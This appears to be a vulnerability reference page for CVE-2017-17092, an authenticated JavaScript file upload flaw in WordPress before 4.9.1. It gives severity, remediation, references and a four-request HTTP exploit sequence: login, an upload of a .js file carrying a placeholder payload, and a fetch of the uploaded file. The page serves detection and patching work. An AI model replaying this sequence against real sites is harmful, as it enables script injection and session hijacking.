---
layout: post
cve_id: CVE-2017-17092
title: WordPress < 4.9.1 - Authenticated JavaScript File Upload
pcap: true
pcap_path: /pcaps/2017/CVE-2017-17092.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17092.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko
severity: medium
impact: 'Remote attackers can execute arbitrary JavaScript in the context of the site,
  leading to potential session hijacking or defacement.

  '
remediation: 'Update to WordPress 4.9.1 or later.

  '
reference:
- https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
- https://wpscan.com/vulnerability/0d2323bd-aecd-4d58-ba4b-597a43034f57
- https://nvd.nist.gov/vuln/detail/CVE-2017-17092
- https://lists.debian.org/debian-lts-announce/2017/12/msg00019.html
- https://wpvulndb.com/vulnerabilities/8966
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 5.4
  cve-id: CVE-2017-17092
  cwe-id: CWE-79
  epss-score: 0.03307
  epss-percentile: 0.8688
  cpe: cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 4
  vendor: wordpress
  product: wordpress
  shodan-query: http.component:"wordpress"
  fofa-query: body="oembed" && body="wp-"
tags:
- cve
- cve2017
- wordpress
- wpscan
- xss
- upload
- authenticated
- intrusive
- file-upload
---

## ðŸ” Vulnerability Description
WordPress before 4.9.1 contains a cross-site scripting caused by not requiring unfiltered_html capability for uploading .js files in functions.php, letting remote attackers execute scripts via crafted files, exploit requires upload permissions.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=A2N2pG&pwd=kYRzEh&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/upload.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/6.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/async-upload.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15
Connection: close
Content-Length: 584
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary38CFAVyKbJZLEwtp9xRYqG5aLS9
Accept-Encoding: gzip

------WebKitFormBoundary38CFAVyKbJZLEwtp9xRYqG5aLS9
Content-Disposition: form-data; name="name"

RrTWHHsN.js
------WebKitFormBoundary38CFAVyKbJZLEwtp9xRYqG5aLS9
Content-Disposition: form-data; name="action"

upload-attachment
------WebKitFormBoundary38CFAVyKbJZLEwtp9xRYqG5aLS9
Content-Disposition: form-data; name="_wpnonce"

egAuWU
------WebKitFormBoundary38CFAVyKbJZLEwtp9xRYqG5aLS9
Content-Disposition: form-data; name="async-upload"; filename="RrTWHHsN.js"
Content-Type: application/javascript

//malicious
------WebKitFormBoundary38CFAVyKbJZLEwtp9xRYqG5aLS9--
```

```nohighlight
GET /wp-content/uploads/BhA8ny/GV1EL6/RrTWHHsN.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

